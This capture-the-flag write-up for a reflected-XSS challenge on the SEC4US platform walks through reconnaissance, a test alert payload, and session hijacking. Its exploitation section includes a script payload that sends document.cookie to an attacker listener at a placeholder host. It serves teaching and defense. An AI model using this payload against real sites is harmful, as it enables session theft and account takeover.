# xss1: Baby XSS

Writeup for the **Baby XSS** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** XSS  
> **Difficulty:** Easy  
> **Points:** 132

---

## Overview

A web application reflects user input directly into the HTML response without any sanitization or encoding, making it trivially vulnerable to reflected Cross-Site Scripting (XSS).

## Reconnaissance

Scan the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Access the web application and identify input fields or URL parameters that are reflected in the page. Test with a simple string to confirm reflection:

```
?name=testXSS123
```

Search for the reflected value in the page source.

## Exploitation

### Step 1: Confirm XSS

Inject a basic script tag:

```html
<script>alert(1)</script>
```

If the alert fires, the application has no XSS protection.

### Step 2: Steal Session Cookies

Set up a listener to capture cookies:

```bash
python3 -m http.server 8080
```

Craft a payload that exfiltrates cookies:

```html
<script>new Image().src='http://<LHOST>:8080/?c='+document.cookie</script>
```

### Step 3: Deliver the Payload

Submit the crafted URL to the simulated victim (bot) or through the application's reporting mechanism.

### Step 4: Retrieve the Flag

Capture the session cookie or token from the incoming request on your listener. Use it to authenticate as the victim and read the flag.

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Drive-by Compromise               | T1189     |
| Steal Web Session Cookie          | T1539     |
| Input Capture                     | T1056     |

### CWE

- **CWE-79:** Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
- **CWE-116:** Improper Encoding or Escaping of Output

---

The simplest XSS is the most dangerous lesson: if no filter stands between input and output, the browser executes whatever it receives.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
